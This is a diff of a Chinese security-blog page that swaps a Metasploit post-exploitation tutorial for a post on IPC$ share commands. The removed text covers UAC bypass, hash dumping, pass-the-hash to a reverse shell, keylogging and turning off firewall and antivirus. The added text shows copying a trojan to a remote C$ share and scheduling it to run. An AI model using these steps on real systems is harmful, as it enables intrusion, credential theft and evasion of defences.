@@ -17,7 +17,7 @@
   <meta name="description" content="">
   <meta name="author" content="">
   <meta name="keywords" content="">
-  <title>Metasploit后渗透 | Cheekkk&#39;s Anti-Gravity Galaxy</title>
+  <title>IPC连接常用命令 | Cheekkk&#39;s Anti-Gravity Galaxy</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
 <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
@@ -118,7 +118,7 @@
                   
                   <span class="post-meta mr-2">
                     <i class="iconfont icon-chart"></i>
-                    1.2k 字
+                    852 字
                   </span>
                 
 
@@ -128,7 +128,7 @@
                       <i class="iconfont icon-clock-fill"></i>
                     
                     
-                    7
+                    5
                      分钟
                   </span>
                 
@@ -157,178 +157,67 @@
           <div class="post-content mx-auto" id="post">
             
             <article class="markdown-body">
-              <p>权限提升、信息收集、HASH、关闭防火墙、令牌假冒</p>
+              <p>IPC连接的一些整理</p>
 <a id="more"></a>
 
-<h1 id="Metasploit后渗透"><a href="#Metasploit后渗透" class="headerlink" title="Metasploit后渗透"></a>Metasploit后渗透</h1><h2 id="01-权限提升"><a href="#01-权限提升" class="headerlink" title="01 权限提升"></a>01 权限提升</h2><ol>
-<li><p><strong>权限提升</strong><br>使用msf获取sessions后，可以使用getuid查看当前用户<br><img src="1.png" srcset="/img/loading.gif" alt=""><br>当前为root权限，不是system权限</p>
-<p>权限提升有三种方法：</p>
-<ul>
-<li>提高程序运行级别</li>
-<li>UAC绕过</li>
-<li>利用提权漏洞进行提权</li>
-</ul>
+<h1 id="IPC连接常用命令"><a href="#IPC连接常用命令" class="headerlink" title="IPC连接常用命令"></a>IPC连接常用命令</h1><h2 id="00-概念"><a href="#00-概念" class="headerlink" title="00 概念"></a>00 概念</h2><p>IPC是英文Internet Process Connection的缩写，可以理解为“命名管道”资源，它是Windows操作系统提供的一个通信基础，用来在两台计算机进程之间建立通信连接，而IPC后面的“$”是Windows系统所使用的隐藏符号，因此“IPC$”表示IPC共享，但是是隐藏的共享</p>
+<p>IPC$是Windows NT及Windows 2000/XP/2003特有的一项功能，通过这项功能，一些网络程序的数据交换可以建立在IPC上面，实现远程访问和管理计算机</p>
+<p>为了配合IPC共享工作，Windows操作系统（不包括Windows 98系列）在安装完成后，自动设置共享的目录为：C盘、D盘、E盘、ADMIN目录（C:\WINNT\）等，即为ADMIN$、C$、D$、E$等等，但要注意，这些共享是隐藏的，只有管理员能够对他们进行远程操作。在MS-DOS中键入“net share”命令来查看本机共享资源</p>
+<h2 id="02-利用条件"><a href="#02-利用条件" class="headerlink" title="02 利用条件"></a>02 利用条件</h2><ol>
+<li>开启了139，445端口</li>
+<li>Windows NT及以上操作系统</li>
+<li>得知目标的用户名和密码</li>
+</ol>
+<h2 id="03-操作命令"><a href="#03-操作命令" class="headerlink" title="03 操作命令"></a>03 操作命令</h2><ol>
+<li><p>建立空连接</p>
+<pre><code class="hljs shell">net use \\127.0.0.1\ipc$ "" /user:""</code></pre>
 </li>
-<li><p><strong>提高程序运行级别</strong><br>使用的msf模块：exploit/windows/local/ask</p>
-<p><img src="2.png" srcset="/img/loading.gif" alt=""><br>设置session的ID，使用run执行即可</p>
-<p>再次切换到session，使用getsystem命令提权<br>发现已经获得了system权限</p>
-<p><img src="3.png" srcset="/img/loading.gif" alt=""></p>
-<p><strong>这种方法需要靶机在弹出框中点击允许，容易被防范</strong></p>
+<li><p>建立完整连接</p>
+<pre><code class="hljs shell">net use \\127.0.0.1\ipc$ "password" /user:"username"</code></pre>
 </li>
-<li><p><strong>UAC绕过</strong><br>使用的msf模块：exploit/windows/local/bypassuac</p>
-<p><img src="4.png" srcset="/img/loading.gif" alt=""><br>设置session的ID，然后执行</p>
-<p>再次切换到session，使用getsystem命令提权<br>发现已经获得了system权限</p>
-<p><img src="3.png" srcset="/img/loading.gif" alt=""></p>
-<p><strong>这种方法不需要需要靶机参与</strong></p>
+<li><p>映射路径</p>
+<pre><code class="hljs shell">net use z: \\127.0.0.1\c$ "密码" /user:"用户名"  (即可将对方的c盘映射为自己的z盘，其他盘类推)</code></pre>
 </li>
-<li><p><strong>利用提权漏洞进行提权</strong><br>使用的msf模块：exploit/windows/local/ms14_058_track_popup_menu</p>
-<p><img src="5.png" srcset="/img/loading.gif" alt=""></p>
-<p>仍然是设置session的ID，然后执行<br>再次切换到session,使用getid命令，发现已经获得了system权限，不需要再次执行getsystem命令</p>
+<li><p>访问路径</p>
+<pre><code class="hljs shell">net use z: \\127.0.0.1\c$   #直接访问</code></pre>
+</li>
+<li><p>删除路径</p>
+<pre><code class="hljs shell">net use c: /del     删除映射的c盘，其他盘类推 
+net use * /del      删除全部,会有提示要求按y确认</code></pre>
+</li>
+<li><p>删除IPC$连接</p>
+<pre><code class="hljs shell">net use \\127.0.0.1\ipc$ /del</code></pre>
+</li>
+<li><p>启动与关闭服务</p>
+<pre><code class="hljs shell">net start //查看已经开启的服务
+net start servername //启动服务
+net stop servername	//关闭服务</code></pre>
+</li>
+<li><p>启动与关闭共享</p>
+<pre><code class="hljs shell">net shate ipc$ //开启ipc$默认共享
+net share ipc$ /del //关闭ipc$默认共享
+net share c=c:\ //完全共享c盘
+net share d=d:\ //删除完全共享的d盘</code></pre>
+</li>
+<li><p>复制远程文件</p>
+<pre><code class="hljs shell">Copy e:\server.exe \\127.0.0.1\c$ \\将本地的E盘下的server.exe这个文件copy到对方系统的C盘根目录下</code></pre>
+
+<p>Copy复制成功所需的条件：必须与主机建立ipc$连接</p>
+</li>
+<li><p>运行远程程序</p>
+<pre><code class="hljs shell">At \\127.0.0.1 12:30 c:\server.exe \\让主机在中午12:30分运行我们已经复制到他C盘根目录下的木马server.exe</code></pre>
+
 </li>
 </ol>
-<h2 id="02-信息收集"><a href="#02-信息收集" class="headerlink" title="02 信息收集"></a>02 信息收集</h2><ol>
-<li><p><strong>信息收集相关模块</strong></p>
-<ul>
-<li>获取硬盘分区：run post/windows/gather/forensics/enum_drives</li>
-<li>判断是否为虚拟机：run post/windows/gather/checkvm</li>
-<li>查看开启的服务：run post/windows/gather/enum_services</li>
-<li>查看共享：run post/windows/gather/enum_shares</li>
-<li>查看最近的文件操作：run post/windows/gather/dumplinks</li>
-<li>查看安装的软件信息：run post/windows/gather/enum_applications</li>
-<li>查看补丁信息：run post/windows/gather/enum_patches</li>
-<li>查看域控：run post/windows/gather/enum_domain</li>
-<li>开启键盘记录： run keyscan_start</li>
-<li>显示键盘记录：run keyscan_dump</li>
-<li>停止键盘记录：run keyscan_stop</li>
-<li>开启远程桌面：run post/windows/manage/enable_rdp run getgui -e</li>
-<li>截图：screenshot</li>
-<li>获取Chrome缓存：run post/windows/gather/enum_chrome</li>
-<li>获取Firefox缓存：run post/windows/gather/enum_firefox</li>
-<li>获取IE缓存：run post/windows/gather/enum_ie</li>
-<li>获取常见信息： run scraper / run wienum</li>
-</ul>
-<p>执行run scraper命令<br><img src="6.png" srcset="/img/loading.gif" alt=""></p>
-<p>导出的结果<br><img src="7.png" srcset="/img/loading.gif" alt=""></p>
-<p>执行run winenum命令<br><img src="8.png" srcset="/img/loading.gif" alt=""></p>
-<p>导出的结果<br><img src="9.png" srcset="/img/loading.gif" alt=""></p>
-</li>
-<li><p><strong>数据包捕获</strong></p>
-<ul>
-<li>抓包<ul>
-<li>加载sniffer：load sniffer</li>
-<li>查看网卡信息：sniffer_interface</li>
-<li>开启监听：sniffer_start 1</li>
-<li>导出数据包：sniffer_dump 1 1.cap</li>
-</ul>
-</li>
-<li>解包<ul>
-<li>run auxiliary/sniffer/psnuffle</li>
-</ul>
-</li>
-<li>抓取的包也可以用wireshark打开</li>
-<li>另外两种抓包方式<ul>
-<li>run packetrecorder</li>
-<li>run post/windows/manage/rpcapd_start</li>
-</ul>
-</li>
-</ul>
-</li>
-</ol>
-<h2 id="03-HASH"><a href="#03-HASH" class="headerlink" title="03 HASH"></a>03 HASH</h2><ol>
-<li><p><strong>hash简介</strong><br>windows下hash密码的格式：用户名：RID：LM-HASH：NT-HASH</p>
-<p>  Windows系统帐户对应固定的RID：</p>
-<ul>
-<li>500： ADMINISTRATOR</li>
-<li>501： GUEST</li>
-<li>502: krbtgt(域环境)</li>
-<li>512: Domain Admins(域环境)</li>
-<li>513: Domain Users(域环境)</li>
-<li>514: Domain Guests(域环境)</li>
-<li>515: Domain Computers(域环境)<ul>
-<li>516: Domain Controllers(域环境)</li>
-<li>1000:root</li>
-</ul>
-</li>
-</ul>
-<p>LM-HASH是IBM设计的，安全性较差</p>
-<p>NT-HASH是微软设计的，较为安全</p>
-</li>
-<li><p><strong>获取hash值</strong></p>
-<ul>
-<li>hashdump</li>
-<li>run post/windows/gather/hashdump<br>hashdump需要有system权限，或者root权限下绕过UAC</li>
-<li>run post/windows/gather/smart_hashdump<br>smart_hashdump可以根据不同的权限和系统采取不同的行动</li>
-</ul>
-<p>hashdump<br><img src="10.png" srcset="/img/loading.gif" alt=""></p>
-<p>run post/windows/gather/hashdump</p>
-<p><img src="/11.png" srcset="/img/loading.gif" alt=""></p>
-<p>run post/windows/gather/smart_hashdump</p>
-<p><img src="12.png" srcset="/img/loading.gif" alt=""></p>
-<p>即使获取了权限，也最好得到管理员的账号密码，防止陌生人登录被发现。并且管理员可能在多个服务器上使用了相同的账号密码</p>
-</li>
-<li><p><strong>HASH破解</strong></p>
-<ul>
-<li>在线破解</li>
-<li>离线破解：findmyhash, L0phtCrack</li>
-<li>msf模块：run auxiliary/analyze/jtr_crack_fast</li>
-<li>hash传递：run exploit/windows/smb/psexec</li>
-</ul>
-<p>hash传递，不用破解，直接使用hash进行登录<br><img src="13.png" srcset="/img/loading.gif" alt=""></p>
-<p>设置payload为反弹tcp，执行即可获取shell</p>
-<p><img src="14.png" srcset="/img/loading.gif" alt=""></p>
-<p>如图可见user为root</p>
-<p><img src="15.png" srcset="/img/loading.gif" alt=""></p>
-</li>
-</ol>
-<h2 id="04-关闭防火墙和杀毒软件"><a href="#04-关闭防火墙和杀毒软件" class="headerlink" title="04 关闭防火墙和杀毒软件"></a>04 关闭防火墙和杀毒软件</h2><ul>
-<li><p>关闭防火墙（管理员及以上权限）（在Windows shell下执行）<br>Netsh advfirewall set allprofiles state off</p>
-</li>
-<li><p>关闭Defender（在Windows shell下执行）<br>Net stop windefend</p>
-</li>
-<li><p>关闭杀毒软件（在meterpreter下执行）</p>
-<ul>
-<li>run killav</li>
-<li>run post/windows/manage/killava</li>
-</ul>
-</li>
-</ul>
-<h2 id="05-令牌假冒"><a href="#05-令牌假冒" class="headerlink" title="05 令牌假冒"></a>05 令牌假冒</h2><ol>
-<li><p><strong>简介</strong><br>令牌假冒可以假冒一个网络中的另一个用户进行操作<br>令牌包括登录会话的安全信息，如用户身份识别、用户组和用户权限<br>当一个用户登录Windows系统是，他就被给定一个访问令牌作为认证会话的一部分</p>
-</li>
-<li><p><strong>Windows安全的相关概念</strong></p>
-<ul>
-<li>Session<ul>
-<li>Session就是一次远程登录或本地登录</li>
-<li>xp及之前每次登陆都会创建一个Session</li>
-<li>vista以后所有交互程序都在Session0中，远程交互在Session1、Session2中</li>
-</ul>
-</li>
-<li>Window Station<ul>
-<li>Windows Station中有不同的desktop</li>
-<li>win logon（登录的桌面）、screen saver（屏保的桌面）、default（平时用的桌面）</li>
-</ul>
-</li>
-<li>Login Session<ul>
-<li>不同的账号登录产生不同的login Session，代表不同的账号权限</li>
-</ul>
-</li>
-<li>Token<ul>
-<li>用户每次登陆，产生LoginSession分配的对应的Token</li>
-<li>Token含有该进程用户账号信息、组信息、权限信息等</li>
-<li>访问资源时会提交Token进行身份验证</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p><strong>Incognito</strong></p>
-<ul>
-<li>独立软件，被集成到msf的meterpreter中</li>
-<li>不用获取账号密码就能窃取Token伪装成合法用户</li>
-<li>适用于域环境下提权渗透</li>
-</ul>
-<p><img src="16.png" srcset="/img/loading.gif" alt=""></p>
-<p><img src="17.png" srcset="/img/loading.gif" alt=""></p>
-</li>
+<h2 id="04-错误代码"><a href="#04-错误代码" class="headerlink" title="04 错误代码"></a>04 错误代码</h2><ol>
+<li>错误号5，拒绝访问 ： 很可能你使用的用户不是管理员权限的，先提升权限；</li>
+<li>错误号51，Windows 无法找到网络路径 : 网络有问题； </li>
+<li>错误号53，找不到网络路径 ： ip地址错误；目标未开机；目标lanmanserver服务未启动；目标有防火墙（端口过滤）</li>
+<li>错误号67，找不到网络名 ： 你的lanmanworkstation服务未启动，目标删除了ipc$；</li>
+<li>错误号1219，提供的凭据与已存在的凭据集冲突 ： 你已经和对方建立了一个ipc$，请删除再连</li>
+<li>错误号1326，未知的用户名或错误密码 </li>
+<li>错误号1792，试图登录，但是网络登录服务没有启动 ： 目标NetLogon服务未启动。（连接域控会出现此情况） </li>
+<li>错误号2242，此用户的密码已经过期 ： 目标有帐号策略，强制定期要求更改密码。</li>
 </ol>
 
             </article>
@@ -336,26 +225,11 @@
             <div>
               <div class="post-metas mb-3">
                 
-                  <div class="post-meta mr-3">
-                    <i class="iconfont icon-category"></i>
-                    
-                      <a class="hover-with-bg" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
-                    
-                  </div>
-                
                 
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/Windows/">Windows</a>
-                    
-                      <a class="hover-with-bg" href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">权限提升</a>
-                    
-                      <a class="hover-with-bg" href="/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">工具使用</a>
-                    
-                      <a class="hover-with-bg" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
-                    
-                      <a class="hover-with-bg" href="/tags/MSF/">MSF</a>
+                      <a class="hover-with-bg" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
                     
                   </div>
                 
@@ -368,18 +242,12 @@
                   <div class="post-prev col-6">
                     
                     
-                      <a href="/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Linux常用命令</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </div>
                   <div class="post-next col-6">
                     
                     
-                      <a href="/Metasploit%E7%AE%80%E4%BB%8B/">
-                        <span class="hidden-mobile">Metasploit简介</span>
+                      <a href="/cobalt-strike%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/">
+                        <span class="hidden-mobile">cobalt strike内网渗透常用命令</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -519,7 +387,7 @@
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "Metasploit后渗透&nbsp;",
+        "IPC连接常用命令&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 40,
